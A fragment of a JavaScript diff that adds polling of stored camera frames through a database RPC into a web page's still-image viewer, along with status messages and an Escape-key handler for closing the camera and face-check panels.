+ if(st){st.classList.add("still");st.classList.remove("live");}
+ $("camStampText").textContent=reason||"still frames";
+ const act=$("camActive");
+ if(act)act.textContent="camera still up";
+ if(!camFrameTimer)camFrameTimer=setInterval(camPullFrame,1300);
+ camPullFrame();
+}
+
+async function camPullFrame(){
+ if(camLive||!camSid)return;
+ const {data,error}=await db.rpc("founder_camera_frames",{p_session:camSid,p_limit:1});
+ if(camLive)return;
+ if(error){ $("camStampText").textContent="relay offline"; clearInterval(camFrameTimer);camFrameTimer=null; return; }
+ const f=(data||[])[0];
+ if(!f){
+  camEmptyPolls++;
+  if(camEmptyPolls>4){
+   $("camStampText").textContent="session ended";
+   clearInterval(camFrameTimer);camFrameTimer=null;
+  }
+  return;
+ }
+ camEmptyPolls=0;
+ const img=$("camStill");
+ if(img)img.src=f.frame;
+ const dl=$("camDl");
+ if(dl)dl.href=f.frame;
+ if($("camLast")&&f.created_at)$("camLast").textContent=ago(f.created_at);
+}
+
+document.addEventListener("keydown",e=>{
+ if(e.key!=="Escape")return;
+ if(!$("camView").classList.contains("hidden")){closeCam();return;}
+ if(!$("faceWrap").classList.contains("hidden"))closeFaceCheck();
+});
+
 (async()=>{
  const {data:{session}}=await db.auth.getSession();
  if(session)await openWebsite();
